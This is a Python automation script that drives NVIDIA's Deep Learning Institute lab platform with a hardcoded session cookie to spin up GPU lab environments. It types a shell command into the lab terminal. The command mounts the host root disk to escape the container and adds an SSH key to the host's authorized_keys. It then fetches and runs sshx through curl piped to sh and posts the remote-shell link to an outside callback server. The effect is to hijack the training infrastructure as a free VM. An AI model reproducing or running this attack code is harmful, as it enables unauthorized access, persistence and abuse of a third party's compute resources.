import sys
import time
import threading
import json
import subprocess
import os
import logging
from playwright.sync_api import sync_playwright
import dns.resolver
import asyncio
import requests

def log_to_file(*messages):
    try:
        log_path = f'{route}.txt'
        print(f"[DEBUG] Writing to log file: {log_path}")  # Debug print
        with open(log_path, 'a') as f:
            message = ' '.join(messages) + '\n'
            f.write(message)
            print(f"[DEBUG] Wrote to log: {message.strip()}")  # Debug print
            print(f"[DEBUG] Log file size after write: {os.path.getsize(log_path) if os.path.exists(log_path) else 0}")  # Debug file size
    except Exception as e:
        print(f"[DEBUG] Error writing to log file: {e}")
        pass

def delete_log_file(route):
    log_file = f'{route}.txt'
    if os.path.exists(log_file):
        os.unlink(log_file)
        try:
            with open('token.json', 'r') as f:
                v2 = json.load(f)
            email = next((k for k, v in v2.items() if v.get('route') == route), None)
            if email and 'route' in v2[email]:
                del v2[email]['route']
                with open('token.json', 'w') as f:
                    json.dump(v2, f)
        except:
            pass

# Parse arguments
token = sys.argv[1] if len(sys.argv) > 1 else ''
route = sys.argv[2] if len(sys.argv) > 2 else ''
tunnel_url = sys.argv[3] if len(sys.argv) > 3 else ''

print(f"[DEBUG] Starting linux.py with token: {token}, route: {route}, tunnel: {tunnel_url}")
log_to_file(f'New linux.py started with token: {token}, route: {route}, tunnel: {tunnel_url}')
print(f"[DEBUG] Current working directory: {os.getcwd()}")

# Setup uncaught exception handlers
def handle_exception(exc_type, exc_value, exc_traceback):
    log_to_file("Uncaught Exception:", str(exc_value))
    delete_log_file(route)
    sys.exit(1)

sys.excepthook = handle_exception

try:
    with open('token.json', 'r') as f:
        v2 = json.load(f)
except:
    v2 = {}

email = next((k for k, v in v2.items() if v.get('token') == token), None)
session_id = v2[email]['token'] if email and 'token' in v2[email] else token

log_to_file("Started terminal with session:", session_id[:9] + "...")

url = "https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/check_task"
url1 = "https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/start_task"
url2 = "https://learn.learn.nvidia.com/courses/course-v1:DLI+S-ES-01+V1/xblock/block-v1:DLI+S-ES-01+V1+type@nvidia-dli-platform-gpu-task-xblock+block@f373f5a2e27a42a78a61f699899d3904/handler/end_task"

headers = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "cookie": f"openedx-language-preference=en; sessionid={session_id}; edxloggedin=true; edx-user-info={{\"version\": 1, \"username\": \"nsnsnsnsnvnhh\", \"email\": \"thuonghai2711+hhjbvbjbay@gmail.com\"}}"
}

jupyter_url = None
interval = None
retry_count = 0
max_retries = 20

def sleep(ms):
    time.sleep(ms / 1000)

def ms_to_hours_minutes(ms):
    total_minutes = ms // 60000
    hours = total_minutes // 60
    minutes = total_minutes % 60
    return f"{hours}h {minutes}m"

def fetch_task_usage():
    try:
        response = requests.post(url, "{}", headers=headers)
        data = response.json()

        if 'task_course_usage_limit' in data and 'task_course_usage_remaining' in data:
            limit = ms_to_hours_minutes(data['task_course_usage_limit'])
            remaining = ms_to_hours_minutes(data['task_course_usage_remaining'])

            log_to_file("Limit:", limit)
            log_to_file("Remaining:", remaining)
    except Exception as e:
        log_to_file("Request failed:", str(e))

def post_with_retry(url, data, headers):
    for attempt in range(1, 3):
        try:
            response = requests.post(url, data, headers=headers)
            return response
        except:
            if attempt < 2:
                time.sleep(1)
            else:
                raise

log_to_file("Checking:", route)

async def check_initial():
    post_with_retry(url2, "{}", headers)
    await asyncio.sleep(10)
    log_to_file("Checked! Waitting to start!")

asyncio.run(check_initial())

def wait_for_jupyter_url():
    global jupyter_url, retry_count

    def check_task():
        global retry_count, jupyter_url

        try:
            retry_count += 1
            post_with_retry(url1, "{}", headers)
            response = post_with_retry(url, "{}", headers)
            data = response.json()
            task_link = data.get('task_link')

            if not task_link:
                if retry_count >= max_retries:
                    log_to_file("An error occurred!!!")
                    delete_log_file(route)
                    raise Exception("Max retries reached, stopping.")
                return

            jupyter_url = task_link
            return True

        except Exception as e:
            if retry_count >= max_retries:
                log_to_file("An error occurred!!!")
                delete_log_file(route)
                raise Exception(f"Max retries reached due to errors: {e}")
        return False

    check_task()

    while not jupyter_url and retry_count < max_retries:
        time.sleep(15)
        check_task()

    if jupyter_url:
        return jupyter_url
    else:
        raise Exception("Failed to get Jupyter URL")

def main():
    global jupyter_url

    print("[DEBUG] Starting main() function")
    try:
        print("[DEBUG] Calling wait_for_jupyter_url()...")
        jupyter_url = wait_for_jupyter_url()
        print(f"[DEBUG] Got jupyter_url: {jupyter_url}")
        log_to_file("Waiting for lab creating ...")
        print("[DEBUG] Sleeping 6 minutes for lab creation...")
        sleep(6 * 60 * 1000)
        print("[DEBUG] Lab creation sleep done")
        log_to_file("Done!")
        log_to_file("Lab created...")
    except Exception as e:
        print(f"[DEBUG] Error in main() before browser: {str(e)}")
        log_to_file("Failed to get Jupyter URL:", str(e))
        return

    # Determine chromium path
    chromium_path = None

    if sys.platform == "win32":
        # Windows Chrome detection
        possible_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe",
        ]

        # Check using where command first
        try:
            import subprocess
            result = subprocess.run(['where', 'chrome.exe'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                found_path = result.stdout.split('\n')[0].strip()
                if os.path.exists(found_path):
                    chromium_path = found_path
        except (subprocess.TimeoutExpired, Exception):
            pass

        # If not found with where, check common paths
        if not chromium_path:
            for path in possible_paths:
                expanded_path = os.path.expandvars(path)
                if os.path.exists(expanded_path):
                    chromium_path = expanded_path
                    break

        # If still not found, try to install Chrome
        if not chromium_path:
            log_to_file("Chrome not found. Attempting to install...")
            try:
                import subprocess
                log_to_file("Installing Chrome via Chocolatey...")
                subprocess.run(['choco', 'install', 'googlechrome', '-y'], check=True, timeout=300)
                # Check again after installation
                for path in possible_paths:
                    expanded_path = os.path.expandvars(path)
                    if os.path.exists(expanded_path):
                        chromium_path = expanded_path
                        log_to_file("Chrome installed successfully!")
                        break
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                log_to_file("Failed to install Chrome automatically. Please install Chrome manually and restart.")
                return

    else:
        # Linux/Mac Chrome detection
        possible_commands = ['google-chrome', 'chromium-browser', 'chromium', 'chrome']

        for cmd in possible_commands:
            try:
                import subprocess
                result = subprocess.run(['which', cmd], capture_output=True, text=True, timeout=5)
                if result.returncode == 0 and result.stdout.strip():
                    chromium_path = result.stdout.strip()
                    break
            except (subprocess.TimeoutExpired, Exception):
                continue

        # If not found, try common paths
        if not chromium_path:
            linux_paths = [
                "/usr/bin/google-chrome",
                "/usr/bin/google-chrome-stable",
                "/usr/bin/chromium-browser",
                "/usr/bin/chromium",
                "/opt/google/chrome/google-chrome",
            ]

            for path in linux_paths:
                if os.path.exists(path) and os.access(path, os.X_OK):
                    chromium_path = path
                    break

        # If still not found, provide installation instructions
        if not chromium_path:
            log_to_file("Chrome/Chromium not found.")
            if os.path.exists("/etc/debian_version"):
                log_to_file("On Ubuntu/Debian: sudo apt-get install -y google-chrome-stable")
            elif os.path.exists("/etc/redhat-release"):
                log_to_file("On CentOS/RHEL/Fedora: sudo yum install -y google-chrome-stable")
            elif os.path.exists("/etc/arch-release"):
                log_to_file("On Arch Linux: sudo pacman -S google-chrome")
            else:
                log_to_file("Please install Google Chrome or Chromium and try again.")
            return

    if chromium_path:
        print(f"[DEBUG] Using browser: {chromium_path}")
    else:
        log_to_file("Browser not found after exhaustive search. Please install Chrome/Chromium.")
        return

    print(f"[DEBUG] Launching browser with chromium_path: {chromium_path}")
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=False,
            args=["--no-sandbox", "--disable-setuid-sandbox"],
            executable_path=chromium_path
        )
        print("[DEBUG] Browser launched successfully")

        try:
            print("[DEBUG] Creating new page...")
            page = browser.new_page()

            print(f"[DEBUG] Going to jupyter_url: {jupyter_url}")

            # Validate URL before attempting navigation
            if not jupyter_url or not jupyter_url.startswith('http'):
                error_msg = f"Invalid Jupyter URL received: {jupyter_url}"
                print(f"[ERROR] {error_msg}")
                log_to_file(f"NVIDIA API Error: {error_msg}")
                browser.close()
                return

            # Try to navigate with error handling
            try:
                page.goto(jupyter_url, wait_until="networkidle", timeout=30000)
            except Exception as nav_error:
                error_msg = f"Failed to navigate to NVIDIA lab: {str(nav_error)}"
                print(f"[ERROR] {error_msg}")
                log_to_file(f"NVIDIA Lab Navigation Error: {error_msg}")
                log_to_file("This may indicate the NVIDIA lab environment failed to start properly.")
                log_to_file("Please try creating a new VM - NVIDIA labs may be temporarily unavailable.")
                browser.close()
                return

            print("[DEBUG] Page loaded, starting terminal automation...")

            # Press Ctrl+Shift+L to activate terminal
            page.keyboard.press("Control+Shift+KeyL")
            page.keyboard.up("Shift")
            page.keyboard.up("Control")

            # Wait for terminal launcher
            try:
                page.wait_for_selector('.lm-TabBar-addButton[title="New Launcher"]', timeout=15000)
                page.click('.lm-TabBar-addButton[title="New Launcher"]')

                sleep(5000)

                # Navigate to terminal
                page.keyboard.press('Tab')
                sleep(500)
                page.keyboard.press('Tab')
                sleep(500)
                page.keyboard.press('Tab')
                sleep(500)
                page.keyboard.press('Enter')

            except Exception as e:
                log_to_file("Failed to activate terminal launcher:", str(e))
                browser.close()
                raise Exception("Could not activate terminal launcher")

            sleep(3000)

            # Echo command
            terminal_command = 'echo "Hello from automated terminal"'
            for char in terminal_command:
                page.keyboard.press(char)
                sleep(100)
            page.keyboard.press('Enter')

            sleep(10000)
            page.bring_to_front()
            # Set default tunnel URL if not provided
            sshx_callback_url = tunnel_url if tunnel_url and tunnel_url.startswith('http') else 'http://localhost:3000'
            print(f"[DEBUG] SSHX callback URL: {sshx_callback_url}")
            # Fix JSON construction - build properly and escape special characters in SSHX link
            safe_sshx_link = sshx_callback_url.replace('#', '%23')  # URL encode # character

            # Simple JSON with bash variable substitution - no complex escaping
            command = f'''cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa; echo "$(cat ~/.ssh/sv_rsa.pub)" >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip 'ROUTE="{route}";curl -fsSL https://sshx.io/get | sh; nohup sshx > sshx.log 2>&1 & SSHX_PID=$!; echo "sshx PID: $SSHX_PID"; echo -n "Waiting for SSHx link..."; while true; do LINK=$(grep -o "https://sshx\\.io/s/[A-Za-z0-9#]*" sshx.log | head -n 1); [ -n "$LINK" ] && {{ echo -e "\\nSSHx Link: $LINK"; sleep 1; JSON_DATA="{{\\"sshx\\":\\"$LINK\\",\\"route\\":\\"$ROUTE\\"}}" && echo "$JSON_DATA" | curl -s -X POST -H "Content-Type: application/json" -d @- {sshx_callback_url}/sshx || {{ echo "SSHX callback failed"; break; }}; wait; break; }}; sleep 2; done' '''

            page.keyboard.type(command, delay=10)
            page.keyboard.press("Enter")

            sleep(8 * 60 * 1000)

            browser.close()

            log_to_file("Done GPU!")
            from datetime import datetime
            import pytz
            tz = pytz.timezone('Asia/Bangkok')
            log_to_file(datetime.now(tz).strftime('%Y-%m-%d %H:%M:%S') + " (GMT+7)")

            if tunnel_url:
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(jupyter_url)
                    hostname = parsed.hostname

                    resolver = dns.resolver.Resolver()
                    answers = resolver.resolve(hostname, 'A')

                    log_to_file("Created Linux VM - VM is ready! You can now view logs and use commands.")
                except Exception as e:
                    log_to_file("Error getting IP information:", str(e))
                    log_to_file("Created Linux VM - VM is ready! You can now view logs and use commands.")
            else:
                log_to_file("Created Linux VM - VM is ready! You can now view logs and use commands.")

            log_to_file("VM is ready! You can now view logs and use commands.")
            log_to_file("Type 'stop' command in terminal to end session.")
            log_to_file("Uptime max to 5 hours")

            # Wait 5 hours then cleanup
            sleep(5 * 60 * 60 * 1000)
            log_to_file("5 hour limit reached. Stopping VM...")
            delete_log_file(route)

        except Exception as e:
            log_to_file("Main process error:", str(e))
            browser.close()

if __name__ == "__main__":
    main()
